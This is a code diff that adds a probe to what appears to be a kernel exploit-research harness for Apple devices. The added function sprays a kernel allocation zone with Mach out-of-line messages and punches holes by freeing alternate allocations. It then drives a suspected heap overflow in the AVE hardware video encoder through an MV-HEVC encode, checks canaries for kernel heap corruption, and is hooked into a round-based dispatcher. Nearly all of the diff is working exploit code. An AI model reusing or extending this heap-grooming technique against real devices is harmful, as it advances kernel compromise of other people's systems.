@@ -14099,6 +14099,322 @@ static void r335_probe(void) {
     fflush(stdout);
 }
 
+/* r337: AVE Heap Overflow with Mach OOL Message Spray
+   r336 showed IOSurface backing doesn't use kalloc.49152. The correct spray
+   for kalloc zones is Mach OOL (out-of-line) message descriptors — kernel
+   copies OOL data into kalloc allocations of exact requested size.
+   Strategy:
+   1. Create many Mach ports, send 0xC000 OOL messages to each
+   2. Receive some messages to create holes in kalloc.49152
+   3. Trigger AVE MV-HEVC encode (400 frames, lid=1 overflow path)
+   4. Receive remaining messages and check for canary corruption */
+static void r337_probe(void) {
+    rlog("\n=== r337: AVE Heap Overflow + Mach OOL Spray ===\n");
+    rlog("  r336: IOSurface backing not in kalloc.49152.\n");
+    rlog("  Strategy: Mach OOL message spray → AVE overflow → check corruption.\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: Mach OOL message spray into kalloc.49152 ---- */
+    rlog("--- Part 1: Mach OOL spray (kalloc.49152) ---\n");
+    fflush(stdout);
+
+    #define OOL_SIZE    0xC000  /* 49152 bytes — targets kalloc.49152 */
+    #define OOL_PORTS   512     /* number of ports to spray */
+    #define OOL_CANARY  0xAB    /* canary byte */
+
+    /* Prepare canary-filled OOL data */
+    uint8_t *ool_data = (uint8_t *)malloc(OOL_SIZE);
+    if (!ool_data) {
+        rlog("  FAIL: malloc OOL data\n");
+        return;
+    }
+    memset(ool_data, OOL_CANARY, OOL_SIZE);
+    /* Write identifiable headers at start and end */
+    ((uint64_t *)ool_data)[0] = 0xCAFEBABE00000000ULL;
+    ((uint64_t *)ool_data)[1] = 0xDEADFACE00000000ULL;
+    /* Write canary pattern at end of allocation (where overflow would hit) */
+    ((uint64_t *)(ool_data + OOL_SIZE - 32))[0] = 0x4141414141414141ULL;
+    ((uint64_t *)(ool_data + OOL_SIZE - 32))[1] = 0x4242424242424242ULL;
+    ((uint64_t *)(ool_data + OOL_SIZE - 32))[2] = 0x4343434343434343ULL;
+    ((uint64_t *)(ool_data + OOL_SIZE - 32))[3] = 0x4444444444444444ULL;
+
+    /* Create ports and send OOL messages */
+    mach_port_t spray_ports[OOL_PORTS];
+    int ports_created = 0;
+    int msgs_sent = 0;
+
+    for (int i = 0; i < OOL_PORTS; i++) {
+        kern_return_t kr = mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &spray_ports[i]);
+        if (kr != KERN_SUCCESS) break;
+
+        /* Insert send right */
+        kr = mach_port_insert_right(mach_task_self(), spray_ports[i],
+            spray_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+        if (kr != KERN_SUCCESS) {
+            mach_port_deallocate(mach_task_self(), spray_ports[i]);
+            break;
+        }
+
+        /* Set queue limit high enough */
+        mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+        mach_port_set_attributes(mach_task_self(), spray_ports[i],
+            MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits,
+            MACH_PORT_LIMITS_INFO_COUNT);
+
+        ports_created++;
+
+        /* Write port index into OOL data for identification */
+        ((uint32_t *)ool_data)[2] = 0xFEED0000 | i;
+
+        /* Send OOL message */
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } msg;
+        memset(&msg, 0, sizeof(msg));
+
+        msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+        msg.hdr.msgh_size = sizeof(msg);
+        msg.hdr.msgh_remote_port = spray_ports[i];
+        msg.hdr.msgh_local_port = MACH_PORT_NULL;
+        msg.hdr.msgh_id = 0x41414141;
+
+        msg.body.msgh_descriptor_count = 1;
+
+        msg.ool.address = ool_data;
+        msg.ool.size = OOL_SIZE;
+        msg.ool.deallocate = 0;
+        msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+            sizeof(msg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+        if (kr == KERN_SUCCESS) msgs_sent++;
+    }
+
+    rlog("  Created %d ports, sent %d OOL messages (0x%X bytes each)\n",
+         ports_created, msgs_sent, OOL_SIZE);
+    rlog("  Total kernel alloc: %d * 0x%X = 0x%llX bytes (%d MB)\n",
+         msgs_sent, OOL_SIZE, (unsigned long long)msgs_sent * OOL_SIZE,
+         (int)((unsigned long long)msgs_sent * OOL_SIZE / (1024*1024)));
+    fflush(stdout);
+
+    /* ---- Part 2: Create holes by receiving some messages ---- */
+    rlog("\n--- Part 2: Create holes (free alternating OOL allocations) ---\n");
+    fflush(stdout);
+
+    int holes_created = 0;
+    /* Free every other allocation to create holes */
+    for (int i = 1; i < ports_created; i += 2) {
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+            mach_msg_trailer_t trailer;
+        } recv_msg;
+        memset(&recv_msg, 0, sizeof(recv_msg));
+
+        kern_return_t kr = mach_msg(&recv_msg.hdr,
+            MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+            0, sizeof(recv_msg), spray_ports[i], 100, MACH_PORT_NULL);
+        if (kr == KERN_SUCCESS) {
+            /* Free the OOL data — this deallocates the kalloc.49152 allocation */
+            if (recv_msg.ool.address && recv_msg.ool.size > 0) {
+                mach_vm_deallocate(mach_task_self(),
+                    (mach_vm_address_t)recv_msg.ool.address, recv_msg.ool.size);
+            }
+            holes_created++;
+        }
+        /* Destroy the port so it's fully freed */
+        mach_port_destroy(mach_task_self(), spray_ports[i]);
+        spray_ports[i] = MACH_PORT_NULL;
+    }
+
+    rlog("  Created %d holes in kalloc.49152\n", holes_created);
+    fflush(stdout);
+
+    /* ---- Part 3: Trigger AVE overflow ---- */
+    rlog("\n--- Part 3: AVE MV-HEVC encode (overflow trigger) ---\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0,
+        &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+
+    VTCompressionSessionRef ave_session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 1920, 1080,
+        kCMVideoCodecType_HEVC, enc_spec, NULL,
+        kCFAllocatorDefault, NULL, NULL, &ave_session);
+
+    rlog("  AVE session: status=%d\n", (int)status);
+
+    if (status == 0 && ave_session) {
+        VTSessionSetProperty(ave_session, CFSTR("HasLeftAndRightViewIds"), kCFBooleanTrue);
+        int hero = 0;
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &hero);
+        VTSessionSetProperty(ave_session, CFSTR("HeroEye"), hn);
+        CFRelease(hn);
+
+        CFMutableArrayRef vids = CFArrayCreateMutable(kCFAllocatorDefault, 2, &kCFTypeArrayCallBacks);
+        int v0 = 0, v1 = 1;
+        CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
+        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
+        CFArrayAppendValue(vids, n0); CFArrayAppendValue(vids, n1);
+        VTSessionSetProperty(ave_session, CFSTR("MVHEVCViewIds"), vids);
+        CFRelease(n0); CFRelease(n1); CFRelease(vids);
+
+        VTCompressionSessionPrepareToEncodeFrames(ave_session);
+
+        int ok = 0, err = 0;
+        for (int f = 0; f < 400; f++) {
+            CVPixelBufferRef pb = NULL;
+            CFMutableDictionaryRef pbattrs = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0,
+                &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef iosurfProps = CFDictionaryCreate(
+                kCFAllocatorDefault, NULL, NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(pbattrs, kCVPixelBufferIOSurfacePropertiesKey, iosurfProps);
+            CFRelease(iosurfProps);
+            CVReturn cvr = CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
+                kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, pbattrs, &pb);
+            CFRelease(pbattrs);
+            if (cvr != 0 || !pb) { err++; continue; }
+
+            CMTime pts = CMTimeMake(f, 30);
+            status = VTCompressionSessionEncodeFrame(ave_session, pb, pts,
+                kCMTimeInvalid, NULL, NULL, NULL);
+            if (status == 0) ok++; else err++;
+            CVPixelBufferRelease(pb);
+
+            if (f % 100 == 0)
+                rlog("  Frame %d: ok=%d err=%d\n", f, ok, err);
+        }
+        VTCompressionSessionCompleteFrames(ave_session, kCMTimeInvalid);
+        rlog("  Encode done: %d ok, %d err (need >314 for overflow)\n", ok, err);
+
+        VTCompressionSessionInvalidate(ave_session);
+        CFRelease(ave_session);
+    }
+    if (enc_spec) CFRelease(enc_spec);
+    fflush(stdout);
+
+    /* ---- Part 4: Check OOL messages for corruption ---- */
+    rlog("\n--- Part 4: Checking OOL messages for heap corruption ---\n");
+    fflush(stdout);
+
+    int checked = 0, corrupted = 0;
+
+    for (int i = 0; i < ports_created; i += 2) {
+        if (spray_ports[i] == MACH_PORT_NULL) continue;
+
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+            mach_msg_trailer_t trailer;
+        } recv_msg;
+        memset(&recv_msg, 0, sizeof(recv_msg));
+
+        kern_return_t kr = mach_msg(&recv_msg.hdr,
+            MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+            0, sizeof(recv_msg), spray_ports[i], 100, MACH_PORT_NULL);
+
+        if (kr != KERN_SUCCESS) continue;
+        if (!recv_msg.ool.address || recv_msg.ool.size == 0) continue;
+
+        checked++;
+        uint8_t *data = (uint8_t *)recv_msg.ool.address;
+        uint32_t data_sz = recv_msg.ool.size;
+
+        /* Check canary integrity */
+        uint64_t hdr0 = ((uint64_t *)data)[0];
+        uint64_t hdr1 = ((uint64_t *)data)[1];
+        int hdr_ok = (hdr0 == 0xCAFEBABE00000000ULL && hdr1 == 0xDEADFACE00000000ULL);
+
+        /* Check canary at beginning (after headers — where overflow from PREVIOUS allocation would land) */
+        int early_corrupt = 0;
+        for (int b = 24; b < 256; b++) {
+            if (data[b] != OOL_CANARY) { early_corrupt++; }
+        }
+
+        /* Check canary bytes throughout */
+        int bad_bytes = 0;
+        int first_bad = -1;
+        for (int b = 24; b < (int)data_sz && bad_bytes < 512; b++) {
+            if (b >= 8 && b < 12) continue; /* skip port index field */
+            if (b >= (int)data_sz - 32) continue; /* skip end markers */
+            if (data[b] != OOL_CANARY) {
+                if (first_bad < 0) first_bad = b;
+                bad_bytes++;
+            }
+        }
+
+        /* Check end markers */
+        uint64_t end0 = ((uint64_t *)(data + data_sz - 32))[0];
+        uint64_t end1 = ((uint64_t *)(data + data_sz - 32))[1];
+        int end_ok = (end0 == 0x4141414141414141ULL && end1 == 0x4242424242424242ULL);
+
+        if (!hdr_ok || bad_bytes > 0 || !end_ok || early_corrupt > 0) {
+            corrupted++;
+            rlog("  *** PORT[%d] CORRUPTED! ***\n", i);
+            rlog("    hdr: 0x%016llx 0x%016llx %s\n", hdr0, hdr1, hdr_ok ? "OK" : "BAD");
+            rlog("    end: 0x%016llx 0x%016llx %s\n", end0, end1, end_ok ? "OK" : "BAD");
+            rlog("    early_corrupt=%d bad_bytes=%d first_bad=0x%X\n",
+                 early_corrupt, bad_bytes, first_bad);
+            if (first_bad >= 0) {
+                int ds = first_bad & ~0xF;
+                rlog("    Dump @ 0x%X: ", ds);
+                for (int d = ds; d < ds + 48 && d < (int)data_sz; d++)
+                    rlog("%02X ", data[d]);
+                rlog("\n");
+            }
+
+            /* Check if the corruption looks like VPS table data */
+            rlog("    First 64 bytes: ");
+            for (int d = 0; d < 64; d++) rlog("%02X ", data[d]);
+            rlog("\n");
+        }
+
+        /* Deallocate OOL data */
+        mach_vm_deallocate(mach_task_self(),
+            (mach_vm_address_t)recv_msg.ool.address, recv_msg.ool.size);
+
+        /* Destroy port */
+        mach_port_destroy(mach_task_self(), spray_ports[i]);
+        spray_ports[i] = MACH_PORT_NULL;
+    }
+
+    rlog("  Checked %d OOL messages: %d corrupted\n", checked, corrupted);
+    if (corrupted > 0) {
+        rlog("  *** KERNEL HEAP CORRUPTION CONFIRMED VIA OOL MESSAGES! ***\n");
+        rlog("  AVE VPS table overflow wrote into adjacent kalloc.49152 allocation!\n");
+    } else {
+        rlog("  No corruption in OOL messages.\n");
+        rlog("  Possible: AVE VPS table uses a different zone, or overflow is contained.\n");
+    }
+
+    /* Cleanup remaining ports */
+    for (int i = 0; i < ports_created; i++) {
+        if (spray_ports[i] != MACH_PORT_NULL)
+            mach_port_destroy(mach_task_self(), spray_ports[i]);
+    }
+    free(ool_data);
+
+    rlog("\n=== r337 complete ===\n");
+    fflush(stdout);
+}
+
 /* r336: AVE Heap Overflow Exploitation with IOSurface Spray
    r335/r331 found: lid=0x1 survives 350 encodes past the 0xC000 kalloc.49152
    boundary. The VPS table at ~0x9B10 in a 0xC000 allocation overflows into
@@ -45712,6 +46028,12 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 340) {
+            rlog("*** rounds=340: AVE Heap Overflow + Mach OOL Spray ***\n");
+            rlog("  r336: IOSurface not in kalloc.49152. OOL messages target correct zone.\n\n");
+            r337_probe();
             goto done;
         }
         if (rounds == 339) {
